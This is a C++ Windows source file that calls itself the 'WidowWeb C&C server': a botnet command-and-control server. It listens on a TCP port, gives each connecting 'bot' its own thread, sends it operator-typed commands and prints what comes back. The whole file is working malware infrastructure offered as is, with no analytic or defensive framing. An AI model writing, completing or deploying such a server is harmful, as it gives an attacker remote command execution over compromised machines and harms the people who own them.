#include <iostream>
#include <thread>
#include <vector>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#include "protocol.h"

void handle_client(SOCKET clientSocket, int id) {
    std::cout << "[Bot #" << id << "] connected.\n";

    while (true) {
        std::string cmd;
        std::cout << "[Bot #" << id << "] Command: ";
        std::getline(std::cin, cmd);

        if (send(clientSocket, cmd.c_str(), cmd.size(), 0) <= 0) break;

        char response[MAX_BUFFER] = {0};
        int bytes = recv(clientSocket, response, MAX_BUFFER, 0);
        if (bytes <= 0) break;

        std::cout << "[Bot #" << id << "] Response: " << response << "\n";
    }

    closesocket(clientSocket);
    std::cout << "[Bot #" << id << "] disconnected.\n";
}

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (serverSocket == INVALID_SOCKET) {
        std::cerr << "❌ Socket error\n";
        return 1;
    }

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "❌ Bind failed\n";
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    listen(serverSocket, 5);
    std::cout << "🧠 WidowWeb C&C server running on port " << SERVER_PORT << "\n";

    int bot_id = 0;
    while (true) {
        sockaddr_in clientAddr{};
        int clientSize = sizeof(clientAddr);
        SOCKET clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientSize);
        if (clientSocket == INVALID_SOCKET) continue;

        std::thread(handle_client, clientSocket, ++bot_id).detach();
    }

    closesocket(serverSocket);
    WSACleanup();
    return 0;
}
